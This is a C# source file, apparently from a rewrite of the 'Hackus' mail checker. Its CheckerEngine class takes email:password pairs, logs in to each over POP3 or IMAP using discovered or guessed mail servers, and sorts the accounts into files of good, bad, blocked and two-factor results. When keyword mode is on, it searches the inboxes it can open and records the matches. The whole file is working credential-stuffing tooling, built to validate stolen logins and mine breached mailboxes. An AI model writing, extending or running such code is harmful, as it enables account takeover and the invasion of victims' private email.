using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using ProtocolType = Clean_Hackus_NET8.Models.Enums.ProtocolType;
using SocketType = Clean_Hackus_NET8.Models.Enums.SocketType;
using System.Threading;
using Clean_Hackus_NET8.Models;
using Clean_Hackus_NET8.Models.Enums;
using Clean_Hackus_NET8.Net.Mail;
using Clean_Hackus_NET8.Services.Managers;

namespace Clean_Hackus_NET8.Services;

/// <summary>
/// Fully synchronous checker — exact same flow as old Hackus MailHandler.Check().
/// Runs inside real Thread objects.
/// 
/// Flow (per mailbox):
/// 1. Build server fallback chain (POP3 SSL → POP3 Plain → IMAP SSL → IMAP Plain)
/// 2. For each server: Connect → WaitPause → Login
/// 3. On Ok: check INBOX access → keyword search if enabled
/// 4. On Bad: stop immediately (wrong password)
/// 5. On Blocked: retry if configured, else record Blocked
/// 6. On Error: retry with counter (IO vs Timeout separate, like old)
/// 7. On HostNotFound: record NoHost, stop
/// </summary>
public class CheckerEngine
{
    private readonly ServerDatabase _serverDb = ServerDatabase.Instance;
    private readonly StatisticsManager _stats = StatisticsManager.Instance;
    private readonly ResultsSaver _results = ResultsSaver.Instance;
    private readonly ThreadsManager _threads = ThreadsManager.Instance;

    private const int MAX_IO_RETRIES = 2;
    private const int MAX_TIMEOUT_RETRIES = 2;

    /// <summary>Check a single mailbox — SYNC, blocks calling thread.</summary>
    public void CheckMailbox(Mailbox mailbox)
    {
        var domain = mailbox.Domain;
        var keywordMode = KeywordSettings.Instance.Enabled && KeywordSettings.Instance.HasKeywords;

        var servers = BuildFallbackChain(domain, keywordMode);

        if (servers.Count == 0)
        {
            _stats.IncrementNoHost();
            _results.SaveNoHost($"{mailbox.Address}:{mailbox.Password}");
            return;
        }

        // Try each server with retry (like old MailHandler.Check)
        int ioRetries = 0;
        int timeoutRetries = 0;
        OperationResult lastResult = OperationResult.Error;

        foreach (var server in servers)
        {
            if (_threads.StopRequested) return;
            _threads.WaitPause(); // Honor pause like old WaitPause()

            lastResult = TryServer(mailbox, server, keywordMode, ref ioRetries, ref timeoutRetries);

            switch (lastResult)
            {
                case OperationResult.Ok:
                    _stats.IncrementGood();
                    _results.SaveGood($"{mailbox.Address}:{mailbox.Password}");
                    // Cache working server for future lookups
                    CacheWorkingServer(server);
                    return;

                case OperationResult.Bad:
                    _stats.IncrementBad();
                    _results.SaveBad($"{mailbox.Address}:{mailbox.Password}");
                    return;

                case OperationResult.HostNotFound:
                    _stats.IncrementNoHost();
                    _results.SaveNoHost($"{mailbox.Address}:{mailbox.Password}");
                    return;

                case OperationResult.Blocked:
                    _stats.IncrementBlocked();
                    _results.SaveBlocked($"{mailbox.Address}:{mailbox.Password}");
                    return;

                case OperationResult.TwoFactor:
                    _stats.IncrementTwoFactor();
                    _results.Save("2FA.txt", $"{mailbox.Address}:{mailbox.Password}");
                    return;

                case OperationResult.Error:
                    // Continue to next server
                    continue;
            }
        }

        // All servers failed
        _stats.IncrementError();
        _results.SaveError($"{mailbox.Address}:{mailbox.Password}");
    }

    /// <summary>Cache a working server back to the DB for future re-use.</summary>
    private void CacheWorkingServer(Server server)
    {
        try
        {
            if (server.Protocol == ProtocolType.POP3)
                _serverDb.SavePop3ToCache(server);
            // IMAP servers from DB are already cached; auto-discovered ones get cached here
        }
        catch { }
    }

    private OperationResult TryServer(Mailbox mailbox, Server server, bool keywordMode,
        ref int ioRetries, ref int timeoutRetries)
    {
        if (server.Protocol == ProtocolType.POP3)
            return TryPop3(mailbox, server, ref ioRetries, ref timeoutRetries);
        else
            return TryImap(mailbox, server, keywordMode, ref ioRetries, ref timeoutRetries);
    }

    // ─── POP3 ─────────────────────────────────────────────────────────

    private OperationResult TryPop3(Mailbox mailbox, Server server,
        ref int ioRetries, ref int timeoutRetries)
    {
        using var client = new Pop3Client(mailbox, server);
        try
        {
            var conn = client.Connect();
            if (conn == OperationResult.HostNotFound) return conn;
            if (conn != OperationResult.Ok) return HandleError(ref ioRetries, ref timeoutRetries, false);

            _threads.WaitPause();

            var login = client.Login();
            client.Disconnect();
            return login;
        }
        catch (IOException) { return HandleError(ref ioRetries, ref timeoutRetries, true); }
        catch (SocketException) { return HandleError(ref ioRetries, ref timeoutRetries, true); }
        catch (TimeoutException) { return HandleError(ref ioRetries, ref timeoutRetries, false); }
        catch { return OperationResult.Error; }
    }

    // ─── IMAP ─────────────────────────────────────────────────────────

    private OperationResult TryImap(Mailbox mailbox, Server server, bool keywordMode,
        ref int ioRetries, ref int timeoutRetries)
    {
        using var client = new ImapClient(mailbox, server);
        try
        {
            var conn = client.Connect();
            if (conn == OperationResult.HostNotFound) return conn;
            if (conn != OperationResult.Ok) return HandleError(ref ioRetries, ref timeoutRetries, false);

            _threads.WaitPause();

            var login = client.Login();
            if (login != OperationResult.Ok)
            {
                client.Disconnect();
                return login;
            }

            _threads.WaitPause();

            // Check INBOX access (like old: CheckFolderAccess)
            var inboxCheck = client.CheckInboxAccess();
            if (inboxCheck != OperationResult.Ok)
            {
                client.Disconnect();
                return OperationResult.Bad; // Can't access INBOX = Bad
            }

            // Keyword search if enabled
            if (keywordMode)
            {
                _threads.WaitPause();
                var query = KeywordSettings.Instance.BuildImapSearchQuery();
                var uids = client.Search(query);
                if (uids.Count > 0)
                {
                    _stats.IncrementFound();
                    _results.SaveFound($"{mailbox.Address}:{mailbox.Password} | KEYWORD ({uids.Count}) | {server.Hostname}:{server.Port}");
                }
            }

            client.Disconnect();
            return OperationResult.Ok;
        }
        catch (IOException) { return HandleError(ref ioRetries, ref timeoutRetries, true); }
        catch (SocketException) { return HandleError(ref ioRetries, ref timeoutRetries, true); }
        catch (TimeoutException) { return HandleError(ref ioRetries, ref timeoutRetries, false); }
        catch { return OperationResult.Error; }
    }

    // ─── Retry logic (separate IO vs Timeout, like old MailHandler.Check) ─────

    private static OperationResult HandleError(ref int ioRetries, ref int timeoutRetries, bool isIoError)
    {
        if (isIoError)
        {
            ioRetries++;
            if (ioRetries <= MAX_IO_RETRIES)
            {
                // Yield instead of heavy sleep — let other threads work
                Thread.Yield();
                return OperationResult.Error; // will retry
            }
        }
        else
        {
            timeoutRetries++;
            if (timeoutRetries <= MAX_TIMEOUT_RETRIES)
            {
                Thread.Yield();
                return OperationResult.Error;
            }
        }

        return OperationResult.Error;
    }

    // ─── Server fallback chain (POP3 first unless keyword mode) ───────

    private List<Server> BuildFallbackChain(string domain, bool keywordMode)
    {
        var chain = new List<Server>();

        if (!keywordMode)
        {
            // POP3 first (like old: faster for login-only check)
            AddServers(chain, _serverDb.GetPop3Servers(domain), domain, ProtocolType.POP3, "pop");
        }

        // Then IMAP
        AddServers(chain, _serverDb.GetImapServers(domain), domain, ProtocolType.IMAP, "imap");

        return chain;
    }

    private static void AddServers(List<Server> chain, List<Server>? fromDb,
        string domain, ProtocolType proto, string prefix)
    {
        if (fromDb != null && fromDb.Count > 0)
        {
            // SSL first, then Plain (like old)
            chain.AddRange(fromDb.Where(s => s.Socket == SocketType.SSL));
            chain.AddRange(fromDb.Where(s => s.Socket == SocketType.Plain));
        }
        else
        {
            // Try auto-discovery first
            try
            {
                var discovered = proto == ProtocolType.POP3
                    ? ServerDiscovery.DiscoverPop3Async(domain).GetAwaiter().GetResult()
                    : ServerDiscovery.DiscoverImapAsync(domain).GetAwaiter().GetResult();

                if (discovered != null)
                {
                    chain.Add(discovered);
                    return;
                }
            }
            catch { }

            // Fallback to common hostnames
            int sslPort = proto == ProtocolType.POP3 ? 995 : 993;
            int plainPort = proto == ProtocolType.POP3 ? 110 : 143;

            chain.Add(new Server
            {
                Domain = domain, Hostname = $"{prefix}.{domain}",
                Port = sslPort, Protocol = proto,
                Socket = SocketType.SSL
            });
            chain.Add(new Server
            {
                Domain = domain, Hostname = $"{prefix}.{domain}",
                Port = plainPort, Protocol = proto,
                Socket = SocketType.Plain
            });

            chain.Add(new Server
            {
                Domain = domain, Hostname = $"mail.{domain}",
                Port = sslPort, Protocol = proto,
                Socket = SocketType.SSL
            });
            chain.Add(new Server
            {
                Domain = domain, Hostname = $"mail.{domain}",
                Port = plainPort, Protocol = proto,
                Socket = SocketType.Plain
            });
        }
    }
}
